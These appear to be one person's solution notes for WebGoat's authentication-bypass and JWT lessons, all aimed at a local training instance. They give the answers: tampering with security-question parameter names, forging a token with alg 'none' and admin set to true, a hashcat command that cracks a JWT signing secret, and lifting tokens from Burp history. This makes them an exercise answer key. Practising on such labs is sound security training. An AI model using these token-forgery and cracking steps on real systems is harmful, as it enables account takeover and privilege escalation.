# Authentication Bypass
### 2
	Method from the story doesn't work.
	But tempering with the names of the variables does.
	Change variable names to 'SecurityQuestionA' and 'SecurityQuestionB'.

# JWT Tokens
### 3
	Paste token to the WebWolf JWT tab and find name "user".
### 5
	Eavesdrop JWT from Tom.
	Put it to WebWolf and change:
	1. {
		"alg" : null
		}
	2. {
		"admin" : "true",
		"iat" : 1649869119, # this may be different
		"user" : "Tom"
		}

### 5
http://javadox.com/io.jsonwebtoken/jjwt/0.4/io/jsonwebtoken/JwtParser.html#parseClaimsJws-java.lang.String-
http://javadox.com/io.jsonwebtoken/jjwt/0.4/io/jsonwebtoken/JwtParser.html#parse-java.lang.String-

eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwidXNlciI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMn0. = 
{
  "alg" : "none",
  "typ" : "JWT"
}
{
  "admin" : true,
  "iat" : 1516239022,
  "sub" : "1234567890",
  "user" : "John Doe"
}

1. Solution 1
2. Solution 3

### 8
Looked for dictionary: https://github.com/first20hours/google-10000-english

hashcat --force -m 16500 <token> google-10000-english.txt.
while knowing secret key: https://jwt.io/.
change username to WebGoat and change expiration date.
paste secret key in the bottom, without "secret base64 encoded".
copy "encoded" field.

### 10
open page 10 while in burp's browser
go to http history
find http://localhost:8080/WebGoat/JWT/refresh/login
find:
{"user":"Jerry","password":"bm5nhSkxCXZkKRy4"}
and
{
  "access_token" : "eyJhbGciOiJIUzUxMiJ9.eyJhZG1pbiI6ImZhbHNlIiwidXNlciI6IkplcnJ5In0.Z-ZX2L0Tuub0LEyj9NmyVADu7tK40gL9h1EJeRg1DDa6z5_H-SrexH1MYHoIxRyApnOP7NfFonP3rOw1Y5qi0A",
  "refresh_token" : "vojbCZRRdMKjdIaAifZY"
}